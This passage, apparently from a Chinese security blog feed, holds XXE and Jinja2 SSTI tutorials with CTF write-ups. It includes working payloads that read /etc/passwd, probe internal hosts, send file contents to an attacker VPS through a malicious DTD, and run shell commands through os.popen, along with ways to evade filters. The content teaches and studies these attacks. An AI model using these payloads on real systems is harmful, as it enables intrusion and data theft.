href="#try-catch-finally结构" class="headerlink" title="try-catch-finally结构"></a>try-catch-finally结构</h3><p><code>try</code>中无异常，直接执行<code>finally</code>，若<code>try</code>中有异常，再到<code>catch</code>内对异常进行处理，最后执行<code>finally</code>，<code>finally</code>通常都会执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimplestTryCatch</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 场景：计算两个数的除法</span></span><br><span class="line">        calculateDivision(<span class="number">10</span>, <span class="number">2</span>);   <span class="comment">// 正常</span></span><br><span class="line">        calculateDivision(<span class="number">10</span>, <span class="number">0</span>);   <span class="comment">// 除以零</span></span><br><span class="line">        calculateDivision(<span class="number">10</span>, <span class="string">&quot;abc&quot;</span>); <span class="comment">// 类型错误</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">calculateDivision</span><span class="params">(<span class="type">int</span> a, Object b)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n计算 &quot;</span> + a + <span class="string">&quot; / &quot;</span> + b);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试转换为数字</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">divisor</span> <span class="operator">=</span> Integer.parseInt(b.toString());</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 计算除法</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> a / divisor;</span><br><span class="line">            System.out.println(<span class="string">&quot;结果：&quot;</span> + result);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;错误：除数不能为0&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;错误：&quot;</span> + b + <span class="string">&quot; 不是有效的数字&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;未知错误：&quot;</span> + e.getMessage());</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;计算完成&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>多个<code>catch</code>并列排开称为<code>多路异常捕获</code>，这样可以全面精准地捕获异常，通常捕获的异常从子类到父类，只执行第一个与异常匹配的<code>catch</code>语句</p></blockquote> <br/>]]></content>
      
      
      <categories>
          
          <category> 零碎 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>外部实体注入(XXE)</title>
      <link href="/2025/11/28/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(XXE)/"/>
      <url>/2025/11/28/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(XXE)/</url>
      
        <content type="html"><![CDATA[<h1 id="外部实体注入-XXE"><a href="#外部实体注入-XXE" class="headerlink" title="外部实体注入(XXE)"></a>外部实体注入(XXE)</h1><p>XXE(XML External Entity Injection)漏洞是一种常见的网络安全漏洞，它允许攻击者对应用程序处理XML数据的过程进行干预。这种漏洞的利用可以导致敏感信息泄露、服务器端请求伪造（SSRF）、内网端口扫描等一系列安全问题</p><br/><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>XML(EXtensible Markup Lannguange)可扩展标记语言</strong>，被设计用来传输和存储数据，以下是一个示例文本</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">catalog</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="string">&quot;TechCorp&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">year</span> <span class="string">&quot;2023&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">products</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;products.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;company;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span><span class="symbol">&amp;year;</span><span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">product</span> <span class="attr">id</span>=<span class="string">&quot;P001&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Laptop<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">price</span>&gt;</span>999<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">product</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">external-data</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;products;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">external-data</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">info</span>&gt;</span>Sample XML for structure analysis<span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xml文本主要是由一堆标签和内容构成的结构化数据，xml可以引入外部实体的特性是产生了XXE漏洞的主要原因，在这里引入实体的部分是</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">catalog</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">company</span> <span class="string">&quot;TechCorp&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">year</span> <span class="string">&quot;2023&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">products</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;products.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>后续在文中使用<code>&amp;company;</code>、<code>&amp;year;</code>、<code>&amp;products;</code>就等同于使用了<code>&quot;TechCorp&quot;</code>、<code>&quot;2023&quot;</code>和<code>products.xml</code>里面的内容</p><br/><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块，实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体分为内部实体和外部实体</p><p><strong>实体声明：</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY %entity0 <span class="string">&quot;value&quot;</span>&gt;</span> //内部声明</span><br><span class="line"><span class="meta">&lt;!ENTITY %entity1 <span class="keyword">SYSTEM</span> <span class="string">&quot;http://123.45.67.89/file&quot;</span>&gt;</span> //外部声明</span><br></pre></td></tr></table></figure><br/><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><table><thead><tr><th align="left">攻击类型</th><th align="left">Payload</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">文件读取</td><td align="left"><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> 然后在XML中引用 <code>&amp;xxe;</code></td><td align="left">利用 <code>file://</code> 协议读取系统文件。如果文件内容含有特殊XML字符，可能导致解析错误</td></tr><tr><td align="left">内网探测 (SSRF)</td><td align="left"><code>&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:8080/&quot;&gt;</code></td><td align="left">利用外部实体请求触发XML解析器向<strong>内网系统</strong>发送HTTP请求，根据响应时间或错误信息判断端口&#x2F;服务状态</td></tr><tr><td align="left">无回显数据外带</td><td align="left">在VPS放置恶意DTD（如 <code>evil.dtd</code>）： <code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> <code>&lt;!ENTITY % eval &quot;&lt;!ENTITY % exfil SYSTEM &#39;http://your-vps.com/?%file;&#39;&gt;&quot;&gt;</code> <code>%eval; %exfil;</code> <br />提交Payload引用该DTD： <code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://your-vps.com/evil.dtd&quot;&gt; %xxe;]&gt;</code></td><td align="left">通过<strong>参数实体</strong>将目标文件内容拼接到发送给攻击者服务器的URL中。查看服务器访问日志即可获取文件内容</td></tr><tr><td align="left">基于错误的文件读取</td><td align="left">在VPS放置恶意DTD（如 <code>error.dtd</code>）： <code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code> <code>&lt;!ENTITY % eval &quot;&lt;!ENTITY % error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;&gt;</code> <code>%eval; %error;</code> <br />提交Payload引用该DTD</td><td align="left">通过将文件内容注入到一个<strong>不存在的路径</strong>中，触发解析错误，从而在<strong>错误信息</strong>中回显文件内容</td></tr></tbody></table><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>这种攻击的核心在于，XML解析器在处理我们声明的外部实体时，会去读取<code>SYSTEM</code>关键字后面指定的URI所指向的资源，一个典型的有回显文件读取Payload如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">content</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></strong>：这行代码在DTD内部定义了一个名为<code>xxe</code>的外部实体，这个实体指向系统上的<code>/etc/passwd</code>文件</p><p><strong><code>&amp;xxe；</code></strong>：在XML文档中，通过<code>&amp;实体名;</code>的格式引用这个实体。当XML解析器处理到此处时，会用<code>/etc/passwd</code>文件的内容替换<code>&amp;xxe;</code></p><p>如果文件内容包含像<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>这类在XML中有特殊意义的字符，解析器可能会报错。为了解决这个问题，我们常常配合使用<strong>PHP包装器</strong>（如果目标环境是PHP）进行Base64编码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样读出的内容会是Base64编码后的，可以避免特殊字符问题，之后需要再手动解码</p><br/><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>这种攻击方式本质上是利用XXE发起SSRF攻击，让XML解析器成为我们探测内网的”探针”，一个基本的探测Payload如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.1.1:8080/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">status</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当XML解析器处理<code>&amp;xxe;</code>时，会尝试访问<code>http://192.168.1.1:8080/</code></p><p>根据响应时间、返回内容（如果回显）或错误信息（如连接拒绝、超时等），我们就可以推断该IP的80端口是否开放，或者相应服务是否存在，在实际渗透测试中，我们可能需要先读取服务器的网络配置文件（如<code>/etc/network/interfaces</code>、<code>/proc/net/arp</code>或<code>/etc/hosts</code>）来获取内网网段信息，然后再进行系统的端口或服务探测</p><br/><h3 id="无回显数据外带"><a href="#无回显数据外带" class="headerlink" title="无回显数据外带"></a>无回显数据外带</h3><p>由于数据不会直接显示在返回的页面上，我们需要通过<strong>参数实体</strong>构建一条外带 通道，将数据外带出来，看看具体的Payload：</p><p><strong>攻击者在VPS上放置的恶意DTD文件</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://123.45.67.89/?file=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure><p><strong><code>% file</code></strong>：这是一个<strong>参数实体</strong>，它也会去读取<code>/etc/passwd</code>文件</p><p><strong><code>% eval</code></strong>：这是另一个参数实体，它的值是一个定义了新实体 <code>% exfil</code> 的XML语句。这个<code>% exfil</code>实体的作用，是向攻击者服务器的8080端口发起一个HTTP请求，并将<code>%file</code>实体的内容（即文件内容）作为URL参数<code>file</code>的值</p><p><strong><code>%eval</code> 和 <code>%exfil</code></strong>：这两个是参数实体引用，它们会依次执行，触发整个数据外带过程</p><p><strong>提交给目标网站的Payload</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://123.45.67.89/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>test<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>% xxe</code></strong>：这个参数实体会去加载远程服务器上的<code>evil.dtd</code>文件</p><p><strong><code>%xxe；</code></strong>：引用此实体，意味着服务器会执行<code>evil.dtd</code>中定义的所有操作</p><br/><h3 id="基于错误的文件读取"><a href="#基于错误的文件读取" class="headerlink" title="基于错误的文件读取"></a>基于错误的文件读取</h3><p>当目标服务器不提供回显，但会返回详细的错误信息时，我们可以利用这种方法，通过错误来让文件内容在错误信息中显示出来，一个典型的利用Payload如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%eval;</span></span><br><span class="line"><span class="meta">%error;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>trigger<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>% file</code></strong>：参数实体，读取目标文件</p><p><strong><code>% eval</code></strong>：参数实体，它的值定义了一个新的参数实体 <code>% error</code>。这个<code>% error</code>实体试图加载一个路径为<code>file:///nonexistent/文件内容</code>的文件</p><p><strong><code>%eval;</code> 和 <code>%error;</code></strong>：当解析器依次处理这些参数实体时，它会尝试去访问一个路径为<code>/nonexistent/</code>加上<code>/etc/passwd</code>文件内容的”文件”。这样的路径显然不存在，从而会触发一个错误（如<code>FileNotFoundException</code>）。而文件内容，因为被作为路径的一部分，就有可能包含在错误信息中返回给我们</p><p>这种方法高度依赖于服务器配置，需要其开启详细的错误回显</p><br/><h3 id="Moe-2025-第十章-天机符阵"><a href="#Moe-2025-第十章-天机符阵" class="headerlink" title="[Moe 2025]第十章 天机符阵"></a>[Moe 2025]第十章 天机符阵</h3><blockquote><p>省流：flag在flag.txt里</p></blockquote><p>注意回显在<code>输出</code>标签里面</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">输出</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><br/><h3 id="极客大挑战2025-Image-Viewer"><a href="#极客大挑战2025-Image-Viewer" class="headerlink" title="[极客大挑战2025]Image Viewer"></a>[极客大挑战2025]Image Viewer</h3><blockquote><p>安全的在线图片预览网站</p></blockquote><p>题目给了一个图片预览接口，可以上传svg格式，可以直接搓XXE</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;100&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看到flag</p><p><img src="/img/post/xxe0.png" alt="flag"></p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务端模板注入(SSTI)</title>
      <link href="/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/"/>
      <url>/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/</url>
      
        <content type="html"><![CDATA[<h1 id="服务端模板注入-SSTI"><a href="#服务端模板注入-SSTI" class="headerlink" title="服务端模板注入(SSTI)"></a>服务端模板注入(SSTI)</h1><p><strong>SSTI（Server-Side Template Injection）</strong> 是一种发生在 <strong>服务端</strong> 的代码注入攻击</p><p><strong>模板</strong>：在 Web 开发中，模板是一种文件（如 HTML），它包含固定的部分（如页面布局）和动态的“占位符”。这些占位符会在服务器端被真实的数据替换，从而生成最终的 HTML 页面发送给用户</p><p><strong>模板引擎</strong>：是用于处理模板的程序。它接收模板文件和数据，然后将数据填充到模板的占位符中，生成最终的 HTML</p><p>当一个应用程序将 用户输入 直接拼接到了模板中，并且没有进行适当的过滤处理时，攻击者就可以输入一段恶意的模板代码。服务器在渲染模板时，会将这些恶意代码当作模板指令来执行</p><br/><h2 id="Jinja2模板引擎-Python-注入"><a href="#Jinja2模板引擎-Python-注入" class="headerlink" title="Jinja2模板引擎(Python)注入"></a>Jinja2模板引擎(Python)注入</h2><p>目前我遇到的极大多数题目都是python的后端jinja2引擎渲染的</p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>我们来看一个最简单的注入payload，它执行的命令读取了<code>/app/flag</code>文件并返回在页面中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&quot;popen&quot;</span>](<span class="string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>.__class__</code>是一个属性，它属于 Python 中每一个对象，这个属性的作用是：返回该对象所属的类。在这里，它返回的是<code>&#39;&#39;</code>这个空字符所属的类，如果单独执行，页面会返回<code>&lt;class &#39;str&#39;&gt;</code>，说明它属于<code>str</code>类</p><p><code>.__base__</code> 是一个属性，它属于一个类（注意，是类，不是对象），这个属性的作用是：返回该类直接继承的父类。这里就是返回<code>&lt;class &#39;str&#39;&gt;</code>的父类，单独执行会返回<code>&lt;class &#39;object&#39;&gt;</code>，说明<code>&lt;class &#39;str&#39;&gt;</code>继承于<code>&lt;class &#39;object&#39;&gt;</code></p><p><code>.__subclasses__[133]</code> 是一个方法，用于获取某个类的所有直接子类，它返回一个列表，包含所有继承自该类的子类对象，后面的[133]表示访问第134个对应的子类，题目环境中单独执行会返回<code>&lt;class &#39;os._wrap_close&#39;&gt;</code></p><blockquote><p><code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类的意义是作为访问系统级功能的跳板和桥梁，获取所有 os 模块的函数</p></blockquote><p><code>.__init__</code>这一部分通过属性访问的方式获取了一个函数对象也就是<code>.__init__</code>本身，这一步是为满足<code>.__globals__</code>的访问条件（只有函数对象才有 <code>__globals__</code> 属性），单独访问的回显是<code>&lt;function _wrap_close.__init__ at 0x7f32e4975af0&gt;</code>，说明已经成功访问到了，内存地址是<code>0x7f32e4975af0</code></p><p><code>.__globals__</code>是在访问这个函数对象的globals属性，这基本上相当于获得了整个 <code>os</code> 模块的完整访问权限，单独使用获得会获得一个庞大的字典</p><p><code>[&#39;popen&#39;]</code>是在通过键名索引获取这个函数，单独使用返回<code>&lt;function popen at 0x7f3d170639d0&gt;</code>代表成功获取<code>(&#39;cat /flag&#39;)</code>则是我们读取flag的命令，返回的是一个类文件对象，比如此处输出应该是<code>&lt;os._wrap_close object at 0x7f3d15552430&gt;</code></p><p><code>.read()</code>是一个方法，用于从文件对象或类文件对象中读取数据，此处用于读取命令的输出，返回<code>flag&#123;······&#125;</code>，此时便完成了SSTI注入的整一个流程</p><br/><p>类似的，以下payload也可能实现一定功能</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125; //利用__builtins__函数字典中的<span class="built_in">eval</span>函数执行python代码</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125; //直接调用os模块</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125; //借用linecache模块间接调用os模块</span><br></pre></td></tr></table></figure><br/><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><blockquote><p>真正做题哪有那么容易，出题人会设置各种各样的waf刁难你</p></blockquote><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><table><thead><tr><th>过滤器函数</th><th>作用</th></tr></thead><tbody><tr><td><code>length()</code></td><td>获取一个序列或字典的长度并将其返回</td></tr><tr><td><code>int()</code></td><td>将值转换成int类型</td></tr><tr><td><code>float()</code></td><td>将值转换成float类型</td></tr><tr><td><code>lower()</code></td><td>将字符串转换成小写</td></tr><tr><td><code>upper()</code></td><td>将字符串转换为大写</td></tr><tr><td><code>reverse()</code></td><td>反转字符串</td></tr><tr><td><code>replace(value,old,new)</code></td><td>将value中的old替换为new</td></tr><tr><td><code>list()</code></td><td>将变量转换成列表类型</td></tr><tr><td><code>string()</code></td><td>将变量（键值）转换成字符串类型</td></tr><tr><td><code>join()</code></td><td>将一个序列中的键拼接成字符串，通常有python内置的<code>dict()</code>配合使用</td></tr><tr><td><code>attr()</code></td><td>获取对象的属性</td></tr></tbody></table><br/><h4 id="过滤双花括号"><a href="#过滤双花括号" class="headerlink" title="过滤双花括号"></a>过滤双花括号</h4><p>以下大量借鉴<a href="https://blog.csdn.net/m0_73185293/article/details/131695528">SSTI漏洞利用及绕过总结(绕过姿势多样)</a></p><p>可将<code>&#123;&#123; &#125;&#125;</code>使用<code>&#123;% %&#125;</code>绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()) %&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>&#123;&#123; &#125;&#125;</code>：用于输出表达式的结果<br><code>&#123;% %&#125;</code>：用于执行语句和控制流程</p></blockquote><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤[ ]"></a>过滤<code>[ ]</code></h4><p>魔术方法<code>__getitem__</code>可代替中括号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(X).__getitem__(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="过滤-、"><a href="#过滤-、" class="headerlink" title="过滤&#39;&#39;、&quot;&quot;"></a>过滤<code>&#39;&#39;</code>、<code>&quot;&quot;</code></h4><p>当单双引号被过滤后，可以使用get或者post传参输入需要带引号的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__base__.__subclasses__()[X].__init__.__globals__[request.args.popen](request.args.cmd).read() &#125;&#125;</span><br><span class="line">同时get传参?popen=popen&amp;cmd=cat /flag</span><br><span class="line">&#123;&#123; ().__class__.__base__.__subclasses__()[X].__init__.__globals__[request.form.popen](request.form.cmd).read() &#125;&#125;</span><br><span class="line">同时post传参?popen=popen&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure><p>也可以对globals字典构造（几乎所有的符号都可以找到）</p><h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><p>当下划线被过滤后，可以使用过滤器输入下划线</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(X) %&#125; //在列表中选中<span class="string">&#x27;_&#x27;</span>即可</span><br></pre></td></tr></table></figure><p>或者分开传参</p><figure class="highlight python"><table><tr><td 